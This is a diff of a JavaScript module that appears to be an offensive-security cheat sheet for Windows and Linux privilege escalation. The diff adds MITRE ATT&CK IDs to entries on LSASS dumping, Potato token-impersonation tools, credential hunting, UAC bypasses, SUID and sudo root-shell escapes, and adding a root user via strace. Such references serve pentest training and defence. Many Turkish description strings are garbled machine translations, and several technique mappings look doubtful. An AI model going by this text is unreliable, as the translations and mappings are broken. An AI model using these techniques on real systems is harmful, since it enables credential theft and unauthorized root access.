+            "desc_tr": "Display ağ arayüzü configuration",
+            "attack": [
+              "T1016"
+            ]
           },
           {
             "title": "Routing Table",
@@ -6233,7 +7177,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Display yönlendirme tablosu"
+            "desc_tr": "Display yönlendirme tablosu",
+            "attack": [
+              "T1016"
+            ]
           },
           {
             "title": "Active Connections",
@@ -6242,7 +7189,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Show active network connections"
+            "desc_tr": "Show active network connections",
+            "attack": [
+              "T1049"
+            ]
           },
           {
             "title": "Running Processes",
@@ -6251,7 +7201,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List all running processes"
+            "desc_tr": "List all running processes",
+            "attack": [
+              "T1057"
+            ]
           },
           {
             "title": "Installed Software (WMIC)",
@@ -6260,7 +7213,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List installed software via WMIC"
+            "desc_tr": "List installed software via WMIC",
+            "attack": [
+              "T1047"
+            ]
           },
           {
             "title": "Installed Patches",
@@ -6269,7 +7225,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List installed hotfixes"
+            "desc_tr": "List installed hotfixes",
+            "attack": [
+              "T1047"
+            ]
           },
           {
             "title": "Scheduled Tasks",
@@ -6278,7 +7237,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Tüm zamanlanmış görevleri listele"
+            "desc_tr": "Tüm zamanlanmış görevleri listele",
+            "attack": [
+              "T1053.005"
+            ]
           },
           {
             "title": "Firewall State",
@@ -6296,7 +7258,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: installed antivirus (WMIC)"
+            "desc_tr": "Kontrol et: installed antivirus (WMIC)",
+            "attack": [
+              "T1047"
+            ]
           },
           {
             "title": "Drives List",
@@ -6305,7 +7270,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List all drives on the system"
+            "desc_tr": "List all drives on the system",
+            "attack": [
+              "T1047"
+            ]
           },
           {
             "title": "WMIC Patches",
@@ -6314,7 +7282,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List installed patches"
+            "desc_tr": "List installed patches",
+            "attack": [
+              "T1047"
+            ]
           },
           {
             "title": "Defender Status",
@@ -6383,7 +7354,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List service binary paths (find unquoted)"
+            "desc_tr": "List service binary paths (find unquoted)",
+            "attack": [
+              "T1047"
+            ]
           },
           {
             "title": "Find Unquoted Service Paths",
@@ -6392,7 +7366,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Tespit et: services unquoted paths containing spaces ile"
+            "desc_tr": "Tespit et: services unquoted paths containing spaces ile",
+            "attack": [
+              "T1047"
+            ]
           },
           {
             "title": "Check Service Permissions (accesschk)",
@@ -6484,7 +7461,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Search for unattended install files with creds"
+            "desc_tr": "Search for unattended install files with creds",
+            "attack": [
+              "T1552.001"
+            ]
           },
           {
             "title": "Registry Run Keys",
@@ -6496,7 +7476,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: autorun registry keys"
+            "desc_tr": "Kontrol et: autorun registry keys",
+            "attack": [
+              "T1547.001"
+            ]
           },
           {
             "title": "Scheduled Tasks Writable",
@@ -6505,7 +7488,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Find writable scheduled task binaries"
+            "desc_tr": "Find writable scheduled task binaries",
+            "attack": [
+              "T1053.005"
+            ]
           },
           {
             "title": "Stored Credentials (cmdkey)",
@@ -6538,7 +7524,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: if mevcut user has impersonatiprivilege üzerinde"
+            "desc_tr": "Kontrol et: if mevcut user has impersonatiprivilege üzerinde",
+            "attack": [
+              "T1033",
+              "T1134.001"
+            ]
           },
           {
             "title": "JuicyPotato",
@@ -6549,7 +7539,10 @@ module.exports = [
               "tool"
             ],
             "note": "Works on Windows Server 2008-2016, Windows 7-10 (before certain patches)",
-            "desc_tr": "İstismar et: r SeImpersonate JuicyPotaile'e"
+            "desc_tr": "İstismar et: r SeImpersonate JuicyPotaile'e",
+            "attack": [
+              "T1134.001"
+            ]
           },
           {
             "title": "PrintSpoofer",
@@ -6560,7 +7553,10 @@ module.exports = [
               "tool"
             ],
             "note": "Works on Windows 10 and Server 2016/2019",
-            "desc_tr": "İstismar et: r SeImpersonate print spooler üzerinden"
+            "desc_tr": "İstismar et: r SeImpersonate print spooler üzerinden",
+            "attack": [
+              "T1134.001"
+            ]
           },
           {
             "title": "GodPotato",
@@ -6571,7 +7567,10 @@ module.exports = [
               "tool"
             ],
             "note": "Works on Windows Server 2012-2022, Windows 8-11",
-            "desc_tr": "İstismar et: r SeImpersonate GodPotaile'e"
+            "desc_tr": "İstismar et: r SeImpersonate GodPotaile'e",
+            "attack": [
+              "T1134.001"
+            ]
           },
           {
             "title": "SweetPotato",
@@ -6580,7 +7579,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "İstismar et: r SeImpersonate SweetPotaile'e"
+            "desc_tr": "İstismar et: r SeImpersonate SweetPotaile'e",
+            "attack": [
+              "T1134.001"
+            ]
           },
           {
             "title": "RoguePotato",
@@ -6589,7 +7591,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "İstismar et: r SeImpersonate RoguePotaile'e"
+            "desc_tr": "İstismar et: r SeImpersonate RoguePotaile'e",
+            "attack": [
+              "T1134.001"
+            ]
           },
           {
             "title": "Check SeBackupPrivilege",
@@ -6598,7 +7603,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: for backup privilege (read any file)"
+            "desc_tr": "Kontrol et: for backup privilege (read any file)",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "Check SeRestorePrivilege",
@@ -6607,7 +7615,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: for restore privilege (write any file)"
+            "desc_tr": "Kontrol et: for restore privilege (write any file)",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "Check SeDebugPrivilege",
@@ -6616,7 +7627,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Kontrol et: for debug privilege (access any process)"
+            "desc_tr": "Kontrol et: for debug privilege (access any process)",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "SeDebugPrivilege Exploit (Mimikatz)",
@@ -6628,9 +7642,14 @@ module.exports = [
             ],
             "note": "SeDebugPrivilege allows reading any process memory",
             "desc_tr": "Dump LSASS with debug privilege",
-            "attack": ["T1003.001", "T1134.002"],
+            "attack": [
+              "T1003.001"
+            ],
             "refs": [
-              { "label": "HackTricks — LSASS", "url": "https://book.hacktricks.xyz/windows-hardening/stealing-credentials" },
+              {
+                "label": "HackTricks — LSASS",
+                "url": "https://book.hacktricks.xyz/windows-hardening/stealing-credentials"
+              },
               "https://attack.mitre.org/techniques/T1003/001/"
             ]
           },
@@ -6643,7 +7662,10 @@ module.exports = [
               "tool"
             ],
             "note": "Analyze dump offline with pypykatz or mimikatz",
-            "desc_tr": "Dump LSASS process memory with procdump"
+            "desc_tr": "Dump LSASS process memory with procdump",
+            "attack": [
+              "T1003.001"
+            ]
           },
           {
             "title": "SeBackupPrivilege File Read",
@@ -6656,7 +7678,11 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Read any file using backup privilege"
+            "desc_tr": "Read any file using backup privilege",
+            "attack": [
+              "T1003.003",
+              "T1003.006"
+            ]
           },
           {
             "title": "SeRestorePrivilege DLL Hijack",
@@ -6688,7 +7714,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List all current token privileges with status"
+            "desc_tr": "List all current token privileges with status",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "Get-Acl Check Permissions",
@@ -6697,7 +7726,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: ACL permissions a file or directory üzerinde"
+            "desc_tr": "Kontrol et: ACL permissions a file or directory üzerinde",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Get-Acl Service Registry",
@@ -6706,7 +7738,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kontrol et: permissions service registry key üzerinde"
+            "desc_tr": "Kontrol et: permissions service registry key üzerinde",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "icacls Check File Permissions",
@@ -6733,7 +7768,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Kontrol et: if service binary path is writable"
+            "desc_tr": "Kontrol et: if service binary path is writable",
+            "attack": [
+              "T1047"
+            ]
           },
           {
             "title": "EfsPotato",
@@ -6743,7 +7781,10 @@ module.exports = [
               "tool"
             ],
             "note": "Works on Windows 10/Server 2016-2019",
-            "desc_tr": "İstismar et: r SeImpersonate EFS service üzerinden"
+            "desc_tr": "İstismar et: r SeImpersonate EFS service üzerinden",
+            "attack": [
+              "T1134.001"
+            ]
           }
         ],
         "name_tr": "Token Abuse & Impersonation"
@@ -6758,7 +7799,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Parola dizgelerini özyinelemeli ara"
+            "desc_tr": "Parola dizgelerini özyinelemeli ara",
+            "attack": [
+              "T1552.001"
+            ]
           },
           {
             "title": "PowerShell History",
@@ -6767,7 +7811,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "PowerShell komut geçmişini oku"
+            "desc_tr": "PowerShell komut geçmişini oku",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "PowerShell History (PS)",
@@ -6776,7 +7823,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Read PS history from PowerShell"
+            "desc_tr": "Read PS history from PowerShell",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "WiFi Passwords",
@@ -6815,7 +7865,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Extract SAM via volume shadow copies"
+            "desc_tr": "Extract SAM via volume shadow copies",
+            "attack": [
+              "T1047"
+            ]
           },
           {
             "title": "IIS Web.config Credentials",
@@ -6824,7 +7877,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: IIS configuratifor kimlik bilgileri üzerinde"
+            "desc_tr": "Kontrol et: IIS configuratifor kimlik bilgileri üzerinde",
+            "attack": [
+              "T1552.001"
+            ]
           },
           {
             "title": "Search Registry for Passwords",
@@ -6842,7 +7898,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Find DPAPI-protected credential files"
+            "desc_tr": "Find DPAPI-protected credential files",
+            "attack": [
+              "T1555"
+            ]
           },
           {
             "title": "DPAPI Master Keys Location",
@@ -6851,7 +7910,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Find DPAPI master key files"
+            "desc_tr": "Find DPAPI master key files",
+            "attack": [
+              "T1555"
+            ]
           },
           {
             "title": "Mimikatz DPAPI Decrypt",
@@ -6861,7 +7923,11 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Şifreyi çöz: DPAPI blobs mimikatz ile"
+            "desc_tr": "Şifreyi çöz: DPAPI blobs mimikatz ile",
+            "attack": [
+              "T1003.001",
+              "T1555"
+            ]
           },
           {
             "title": "SharpDPAPI Triage",
@@ -6871,7 +7937,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Otomatik DPAPI kimlik bilgileri extraction"
+            "desc_tr": "Otomatik DPAPI kimlik bilgileri extraction",
+            "attack": [
+              "T1555"
+            ]
           },
           {
             "title": "Find KeePass Database Files",
@@ -6889,7 +7958,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Search for SSH private keys on Windows"
+            "desc_tr": "Search for SSH private keys on Windows",
+            "attack": [
+              "T1552.001"
+            ]
           },
           {
             "title": "Saved RDP Credentials",
@@ -6916,7 +7988,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Extract saved browser passwords"
+            "desc_tr": "Extract saved browser passwords",
+            "attack": [
+              "T1555.003"
+            ]
           },
           {
             "title": "Snaffler Credential Finder",
@@ -6938,7 +8013,10 @@ module.exports = [
               "essential"
             ],
             "note": "Check Groups.xml, Services.xml, Scheduledtasks.xml",
-            "desc_tr": "Find Group Policy passwords"
+            "desc_tr": "Find Group Policy passwords",
+            "attack": [
+              "T1552.006"
+            ]
           },
           {
             "title": "Invoke-PrivescCheck",
@@ -7000,7 +8078,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Suggest exploits based systeminfo output üzerinde"
+            "desc_tr": "Suggest exploits based systeminfo output üzerinde",
+            "attack": [
+              "T1082"
+            ]
           },
           {
             "title": "Watson (.NET)",
@@ -7018,7 +8099,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Find missing patches for known privesc"
+            "desc_tr": "Find missing patches for known privesc",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Check System Architecture",
@@ -7027,7 +8111,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Determine 32/64-bit for istismar compatibility"
+            "desc_tr": "Determine 32/64-bit for istismar compatibility",
+            "attack": [
+              "T1082"
+            ]
           },
           {
             "title": "Check OS Version",
@@ -7036,7 +8123,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Get exact OS version and build"
+            "desc_tr": "Get exact OS version and build",
+            "attack": [
+              "T1082"
+            ]
           }
         ],
         "name_tr": "Kernel Exploits"
@@ -7052,7 +8142,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Kapsamlı Windows yetki yükseltme tarayıcı"
+            "desc_tr": "Kapsamlı Windows yetki yükseltme tarayıcı",
+            "attack": [
+              "T1068"
+            ]
           },
           {
             "title": "WinPEAS (Quiet Mode)",
@@ -7061,7 +8154,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "WinPEAS reduced output ile"
+            "desc_tr": "WinPEAS reduced output ile",
+            "attack": [
+              "T1082",
+              "T1068"
+            ]
           },
           {
             "title": "PowerUp (PowerShell)",
@@ -7074,7 +8171,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "PowerShell yetki yükseltme tarayıcı"
+            "desc_tr": "PowerShell yetki yükseltme tarayıcı",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Seatbelt",
@@ -7104,7 +8204,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "PowerShell yetki yükseltme listeleme"
+            "desc_tr": "PowerShell yetki yükseltme listeleme",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Seatbelt Specific Checks",
@@ -7141,7 +8244,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Bir diğer Windows (Enum) scripti — JAWS"
+            "desc_tr": "Bir diğer Windows (Enum) scripti — JAWS",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Windows Exploit Suggester NG",
@@ -7152,7 +8258,10 @@ module.exports = [
               "tool"
             ],
             "note": "Use: systeminfo > systeminfo.txt, then transfer to attacker",
-            "desc_tr": "Suggest exploits systeminfo (Python) üzerinden"
+            "desc_tr": "Suggest exploits systeminfo (Python) üzerinden",
+            "attack": [
+              "T1082"
+            ]
           },
           {
             "title": "WinPEAS Services Info",
@@ -7161,7 +8270,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "WinPEAS focused service misconfigurations üzerinde"
+            "desc_tr": "WinPEAS focused service misconfigurations üzerinde",
+            "attack": [
+              "T1068"
+            ]
           },
           {
             "title": "WinPEAS Network Info",
@@ -7170,7 +8282,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "WinPEAS focused network information üzerinde"
+            "desc_tr": "WinPEAS focused network information üzerinde",
+            "attack": [
+              "T1068"
+            ]
           }
         ],
         "name_tr": "Automated Scanners"
@@ -7189,7 +8304,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Bypass via fodhelper"
+            "desc_tr": "Bypass via fodhelper",
+            "attack": [
+              "T1059.003",
+              "T1548.002"
+            ]
           },
           {
             "title": "UAC — eventvwr",
@@ -7201,7 +8320,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Bypass via Event Viewer"
+            "desc_tr": "Bypass via Event Viewer",
+            "attack": [
+              "T1059.003",
+              "T1548.002"
+            ]
           },
           {
             "title": "UAC — sdclt",
@@ -7214,7 +8337,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Bypass via sdclt"
+            "desc_tr": "Bypass via sdclt",
+            "attack": [
+              "T1059.003"
+            ]
           }
         ],
         "name_tr": "UAC Bypass"
@@ -7248,7 +8374,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Display kernel versiand architecture üzerinde"
+            "desc_tr": "Display kernel versiand architecture üzerinde",
+            "attack": [
+              "T1082"
+            ]
           },
           {
             "title": "OS Release Info",
@@ -7284,7 +8413,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Show network interfaces"
+            "desc_tr": "Show network interfaces",
+            "attack": [
+              "T1016"
+            ]
           },
           {
             "title": "Active Connections",
@@ -7293,7 +8425,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Show listening ports and connections"
+            "desc_tr": "Show listening ports and connections",
+            "attack": [
+              "T1049"
+            ]
           },
           {
             "title": "Running Processes",
@@ -7338,7 +8473,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kontrol et: if shadow file is readable"
+            "desc_tr": "Kontrol et: if shadow file is readable",
+            "attack": [
+              "T1003.008"
+            ]
           },
           {
             "title": "Home Directories",
@@ -7356,7 +8494,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Search for SSH private keys"
+            "desc_tr": "Search for SSH private keys",
+            "attack": [
+              "T1552.001"
+            ]
           },
           {
             "title": "Bash History",
@@ -7365,7 +8506,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Read bash history for all accessible users"
+            "desc_tr": "Read bash history for all accessible users",
+            "attack": [
+              "T1552.003"
+            ]
           },
           {
             "title": "Installed Packages (RedHat)",
@@ -7392,7 +8536,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Scan ports with bash"
+            "desc_tr": "Scan ports with bash",
+            "attack": [
+              "T1059.004"
+            ]
           }
         ],
         "name_tr": "System Reconnaissance"
@@ -7407,7 +8554,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Find all SUID binaries on the system"
+            "desc_tr": "Find all SUID binaries on the system",
+            "attack": [
+              "T1548.001"
+            ]
           },
           {
             "title": "Find SGID Binaries",
@@ -7425,7 +8575,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Find all SUID and SGID binaries"
+            "desc_tr": "Find all SUID and SGID binaries",
+            "attack": [
+              "T1548.001"
+            ]
           },
           {
             "title": "SUID bash -p",
@@ -7435,7 +8588,10 @@ module.exports = [
               "essential"
             ],
             "note": "GTFOBins: bash",
-            "desc_tr": "bash SUID ise root kabuğu başlat"
+            "desc_tr": "bash SUID ise root kabuğu başlat",
+            "attack": [
+              "T1548.001"
+            ]
           },
           {
             "title": "SUID find Exec",
@@ -7445,7 +8601,10 @@ module.exports = [
               "essential"
             ],
             "note": "GTFOBins: find",
-            "desc_tr": "Yetki yükselt: SUID find binary üzerinden"
+            "desc_tr": "Yetki yükselt: SUID find binary üzerinden",
+            "attack": [
+              "T1548.001"
+            ]
           },
           {
             "title": "SUID vim Shell",
@@ -7455,7 +8614,10 @@ module.exports = [
               "essential"
             ],
             "note": "GTFOBins: vim",
-            "desc_tr": "Yetki yükselt: SUID vim üzerinden"
+            "desc_tr": "Yetki yükselt: SUID vim üzerinden",
+            "attack": [
+              "T1548.001"
+            ]
           },
           {
             "title": "SUID python Shell",
@@ -7465,7 +8627,11 @@ module.exports = [
               "essential"
             ],
             "note": "GTFOBins: python",
-            "desc_tr": "Yetki yükselt: SUID pythüzerinden üzerinde"
+            "desc_tr": "Yetki yükselt: SUID pythüzerinden üzerinde",
+            "attack": [
+              "T1059.006",
+              "T1548.001"
+            ]
           },
           {
             "title": "SUID nmap Interactive",
@@ -7475,7 +8641,11 @@ module.exports = [
               "essential"
             ],
             "note": "GTFOBins: nmap (versions 2.02-5.21)",
-            "desc_tr": "Yetki yükselt: SUID nmap (old versions) üzerinden"
+            "desc_tr": "Yetki yükselt: SUID nmap (old versions) üzerinden",
+            "attack": [
+              "T1046",
+              "T1548.001"
+            ]
           },
           {
             "title": "SUID cp Overwrite Passwd",
@@ -7489,7 +8659,11 @@ module.exports = [
               "advanced"
             ],
             "note": "GTFOBins: cp",
-            "desc_tr": "Üzerine yaz: /etc/passwd SUID cp üzerinden"
+            "desc_tr": "Üzerine yaz: /etc/passwd SUID cp üzerinden",
+            "attack": [
+              "T1059.004",
+              "T1548.001"
+            ]
           },
           {
             "title": "SUID env Shell",
@@ -7498,7 +8672,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Yetki yükselt: SUID env üzerinden"
+            "desc_tr": "Yetki yükselt: SUID env üzerinden",
+            "attack": [
+              "T1548.001"
+            ]
           }
         ],
         "name_tr": "SUID & SGID Abuse"
@@ -7513,7 +8690,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Show what current user can run as sudo"
+            "desc_tr": "Show what current user can run as sudo",
+            "attack": [
+              "T1548.003"
+            ]
           },
           {
             "title": "Sudo bash",
@@ -7531,7 +8711,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Escape shell sudo vim üzerinden'e"
+            "desc_tr": "Escape shell sudo vim üzerinden'e",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Sudo find Exec",
@@ -7540,7 +8723,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "komut enjeksiyonu sudo find üzerinden"
+            "desc_tr": "komut enjeksiyonu sudo find üzerinden",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Sudo python Shell",
@@ -7549,7 +8735,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Root shell sudo pythüzerinden üzerinde"
+            "desc_tr": "Root shell sudo pythüzerinden üzerinde",
+            "attack": [
+              "T1059.004",
+              "T1059.006"
+            ]
           },
           {
             "title": "Sudo perl Shell",
@@ -7558,7 +8748,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Root shell sudo perl üzerinden"
+            "desc_tr": "Root shell sudo perl üzerinden",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Sudo awk Shell",
@@ -7567,7 +8760,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Root shell sudo awk üzerinden"
+            "desc_tr": "Root shell sudo awk üzerinden",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Sudo less Shell",
@@ -7576,7 +8772,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Shell escape sudo less üzerinden"
+            "desc_tr": "Shell escape sudo less üzerinden",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Sudo more Shell",
@@ -7585,7 +8784,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Shell escape sudo more üzerinden"
+            "desc_tr": "Shell escape sudo more üzerinden",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Sudo nmap Shell",
@@ -7594,7 +8796,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Root shell sudo nmap üzerinden"
+            "desc_tr": "Root shell sudo nmap üzerinden",
+            "attack": [
+              "T1046",
+              "T1059.004"
+            ]
           },
           {
             "title": "Sudo tee Write Files",
@@ -7603,7 +8809,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Write to privileged files via sudo tee"
+            "desc_tr": "Write to privileged files via sudo tee",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Sudo wget File Overwrite",
@@ -7612,7 +8821,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Üzerine yaz: files sudo wget üzerinden"
+            "desc_tr": "Üzerine yaz: files sudo wget üzerinden",
+            "attack": [
+              "T1105"
+            ]
           },
           {
             "title": "Sudo cp File Overwrite",
@@ -7621,7 +8833,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Copy files as root via sudo cp"
+            "desc_tr": "Copy files as root via sudo cp",
+            "attack": [
+              "T1003.008"
+            ]
           },
           {
             "title": "Sudo env Shell",
@@ -7630,7 +8845,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Root shell sudo env üzerinden"
+            "desc_tr": "Root shell sudo env üzerinden",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Sudo tar Shell",
@@ -7639,7 +8857,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Root shell sudo tar üzerinden"
+            "desc_tr": "Root shell sudo tar üzerinden",
+            "attack": [
+              "T1059.004",
+              "T1560"
+            ]
           },
           {
             "title": "Sudo zip Shell",
@@ -7648,7 +8870,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Root shell sudo zip üzerinden"
+            "desc_tr": "Root shell sudo zip üzerinden",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Sudo git Shell",
@@ -7657,7 +8882,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Root shell sudo git üzerinden"
+            "desc_tr": "Root shell sudo git üzerinden",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "LD_PRELOAD Escalation",
@@ -7671,7 +8899,11 @@ module.exports = [
               "advanced"
             ],
             "note": "Only works if env_keep contains LD_PRELOAD",
-            "desc_tr": "Kötüye kullan: LD_PRELOAD sudo configuration içinde"
+            "desc_tr": "Kötüye kullan: LD_PRELOAD sudo configuration içinde",
+            "attack": [
+              "T1059.004",
+              "T1548.001"
+            ]
           },
           {
             "title": "LD_LIBRARY_PATH Escalation",
@@ -7695,7 +8927,10 @@ module.exports = [
               "advanced"
             ],
             "note": "Affects sudo versions 1.8.2-1.8.31p2, 1.9.0-1.9.5p1",
-            "desc_tr": "1.9.5p2 öncesi sürümleri etkileyen Sudo heap taşması (Baron Samedit)"
+            "desc_tr": "1.9.5p2 öncesi sürümleri etkileyen Sudo heap taşması (Baron Samedit)",
+            "attack": [
+              "T1059.006"
+            ]
           },
           {
             "title": "Sudo CVE-2019-14287 (Run as -1)",
@@ -7705,7 +8940,10 @@ module.exports = [
               "advanced"
             ],
             "note": "Works when sudoers has (ALL, !root) - sudo < 1.8.28",
-            "desc_tr": "Bypass sudo runas restriction with UID -1"
+            "desc_tr": "Bypass sudo runas restriction with UID -1",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Sudo NOPASSWD Abuse",
@@ -7715,7 +8953,10 @@ module.exports = [
               "essential"
             ],
             "note": "Any NOPASSWD entry is a potential escalation vector",
-            "desc_tr": "Kontrol et: for NOPASSWD entries sudo -l içinde"
+            "desc_tr": "Kontrol et: for NOPASSWD entries sudo -l içinde",
+            "attack": [
+              "T1548.003"
+            ]
           },
           {
             "title": "Sudo apache2 Shell",
@@ -7725,7 +8966,10 @@ module.exports = [
               "tool"
             ],
             "note": "Leaks shadow file contents in error message",
-            "desc_tr": "Root shell sudo apache2 üzerinden"
+            "desc_tr": "Root shell sudo apache2 üzerinden",
+            "attack": [
+              "T1003.008"
+            ]
           },
           {
             "title": "Sudo Node.js Shell",
@@ -7734,7 +8978,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Root shell sudo node üzerinden"
+            "desc_tr": "Root shell sudo node üzerinden",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Sudo Docker Shell",
@@ -7752,7 +8999,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Root shell sudo mysql üzerinden"
+            "desc_tr": "Root shell sudo mysql üzerinden",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Sudo SSH-Keygen Shell",
@@ -7771,7 +9021,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Yetki yükselt: root sudo strace — spawns a shell tracing üzerinden'e üzerinden"
+            "desc_tr": "Yetki yükselt: root sudo strace — spawns a shell tracing üzerinden'e üzerinden",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Sudo strace (sh variant)",
@@ -7790,7 +9043,11 @@ module.exports = [
               "advanced"
             ],
             "note": "Then: su hacker (no password needed)",
-            "desc_tr": "Add root user via strace — full command injection through traced process"
+            "desc_tr": "Add root user via strace — full command injection through traced process",
+            "attack": [
+              "T1059.004",
+              "T1190"
+            ]
           }
         ],
         "name_tr": "Sudo Misconfigurations"
@@ -7805,7 +9062,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List all cron jobs for current user"
+            "desc_tr": "List all cron jobs for current user",
